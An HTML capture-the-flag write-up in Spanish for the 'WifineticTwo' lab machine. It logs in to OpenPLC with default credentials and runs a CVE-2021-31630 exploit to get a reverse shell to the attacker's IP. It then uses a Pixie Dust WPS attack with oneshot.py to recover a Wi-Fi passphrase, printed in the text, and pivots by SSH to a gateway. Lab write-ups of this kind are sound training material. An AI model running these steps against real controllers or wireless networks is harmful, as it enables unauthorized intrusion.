<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WifineticTwo</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WifineticTwo</h1><br/><p><ol><li> Realizo un escaneo de la máquina<strong> nmap 10.10.11.7 -Pn -sC -sV -A -p- -T4 -oA scan</strong></li><li>Encuentro los servicios <strong>SSH</strong> y <strong>HTTP</strong> abiertos</li><li>Con el parametro -sC encuentro un login </li></ol><img src="images/72-1.png" alt="images/72-1.png" /><ol><li>Pruebo con las credenciales default y consigo entrar &quot;<strong>openplc</strong>:<strong>openplc</strong>&quot;</li><li>Encuentro un apartado para subir programas Pero tienen que ser con extensión .st</li><li>Busco en internet algún exploit y encuentro CVE-2021-31630 que permite RCE Auntentificado.</li><li>Ejecuto la script <strong>python exploit.py -ip &lt;YOUR IP&gt; -p &lt;YOUR PORT&gt; -u &lt;USERNAME&gt; -pwd &lt;PASSWORD&gt;</strong></li><li>Obtengo el reverse shell  </li></ol><img src="images/72-2.png" alt="images/72-2.png" /><ol><li>En esta máquina soy el usuario root pero no encuentro la flag de root. </li></ol><img src="images/72-3.png" alt="images/72-3.png" /><ol><li>Creo que voy a tener que pivotar a otra máquina para obtener el root.</li><li> con <strong>ifconfig</strong> encuentro otra red </li></ol><img src="images/72-4.png" alt="images/72-4.png" /><ol><li>Voy a escanear esta red pero no está <strong>nmap</strong> instalado por lo que uso el comando <strong>arp</strong> </li></ol><img src="images/72-5.png" alt="images/72-5.png" /><ol><li></li></ol><img src="images/72-6.png" alt="images/72-6.png" /><ol><li>Definitivamente el pivoting está ahí</li><li>En la ruta /etc encuentro algo relacionado con el WPA </li></ol><img src="images/72-7.png" alt="images/72-7.png" /><ol><li>Escaneo la wlan0  <strong>iwlist wlan0 scan</strong> </li></ol><img src="images/72-8.png" alt="images/72-8.png" /><ol><li>El protocolo de seguridad es vulnerable a ataques pixie dust </li></ol><img src="images/72-9.png" alt="images/72-9.png" /><ol><li>Este ataque nos permite recuperar la clave de red wifi</li><li>Paso el archivo oneshot.py a mi maquina atacada </li></ol><img src="images/72-10.png" alt="images/72-10.png" /><ol><li>Tenemos que pasarle los parámetros correctos </li></ol><img src="images/72-11.png" alt="images/72-11.png" /><ol><li>Ejecutamos el script<strong> python3 oneshot.py -b 02:00:00:00:01:00 -i wlan0 -K </strong></li><li>Obtenemos la contraseña de la red </li></ol><img src="images/72-12.png" alt="images/72-12.png" /><ol><li>El sistema cuenta con estos comandos tanto como para administrar una red como para administrar los servicios del sistema </li></ol><img src="images/72-13.png" alt="images/72-13.png" /><ol><li>Uso esta guia para conectarme a la red usando wpa_supplicant <a href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant</a> <strong>wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf</strong> </li></ol><img src="images/72-14.png" alt="images/72-14.png" /><ol><li></li></ol><img src="images/72-15.png" alt="images/72-15.png" /><ol><li> Creamos otro archivo en <strong>systemd</strong> </li></ol><img src="images/72-16.png" alt="images/72-16.png" /><ol><li>Asignamos la dirección IP<strong> sudo ifconfig wlan0 192.168.1.7 netmask 255.255.255.0 up</strong></li><li>con ip a vemos las direcciónes dentro de la red </li></ol><img src="images/72-17.png" alt="images/72-17.png" /><ol><li>Hago un<strong> arp -a</strong> a esa red y encuentro un gateway</li><li>Accedo a través de ssh a ese gateway y encuentro la flag root </li></ol><img src="images/72-18.png" alt="images/72-18.png" /><ol><li></li></ol></p></div>
</body>
</html>
